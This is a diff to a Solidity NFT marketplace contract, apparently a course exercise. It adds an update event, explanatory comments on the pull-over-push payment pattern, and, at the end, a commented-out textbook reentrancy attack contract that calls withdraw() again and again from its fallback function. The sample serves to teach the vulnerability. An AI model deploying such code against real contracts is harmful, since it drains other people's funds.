@@ -29,6 +29,13 @@ contract NftMarketplace is ReentrancyGuard {
         uint256 price
     );
 
+    event ItemUpdated(
+        address indexed seller,
+        address indexed nftAddress,
+        uint256 indexed tokenId,
+        uint256 newPrice
+    );
+
     event ItemDeleted(
         address indexed seller,
         address indexed nftAddress,
@@ -42,7 +49,9 @@ contract NftMarketplace is ReentrancyGuard {
         uint256 price
     );
 
+    //  Mapping NFT Contract address -> NFT TokenID -> Listing
     mapping(address => mapping(uint256 => Listing)) private s_listings;
+    //  Mapping Seller address -> Amount earned
     mapping(address => uint256) private s_proceeds;
 
     modifier notListed(
@@ -144,7 +153,8 @@ contract NftMarketplace is ReentrancyGuard {
             revert PriceNotMet(nftAddress, tokenId, listedItem.price);
         }
         s_proceeds[listedItem.seller] += msg.value;
-        // Could just send the money...
+        // Could just send the money directly...
+        // Solidity uses pull over push: Rather than sending funds to the user we want to have them withdraw the funds
         // https://fravoll.github.io/solidity-patterns/pull_over_push.html
         delete (s_listings[nftAddress][tokenId]);
         IERC721(nftAddress).safeTransferFrom(listedItem.seller, msg.sender, tokenId);
@@ -168,7 +178,7 @@ contract NftMarketplace is ReentrancyGuard {
         isOwner(nftAddress, tokenId, msg.sender)
     {
         s_listings[nftAddress][tokenId].price = newPrice;
-        emit ItemListed(msg.sender, nftAddress, tokenId, newPrice);
+        emit ItemUpdated(msg.sender, nftAddress, tokenId, newPrice);
     }
 
     /*
@@ -200,3 +210,29 @@ contract NftMarketplace is ReentrancyGuard {
         return s_proceeds[seller];
     }
 }
+
+/*
+
+// CONTRACT TO REENTRACY ATTACK
+contract Attack {
+    ReentrantVulnerable public reentrantVulnerable;
+    
+    constructor(address _reentrantVulnerableAddress) {
+        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerableAddress);
+    }
+
+    function attack() external payable {
+        reentrantVulnerable.deposit{value: 1 ether}();
+        reentrantVulnerable.withdraw();
+    }
+
+    fallback() external payable {
+        if(address(reentrantVulnerable).balance >= 1 ether) {
+            reentrantVulnerable.withdraw();
+        }
+    }
+
+    // Helper function to check the balance of this contract
+}
+
+*/
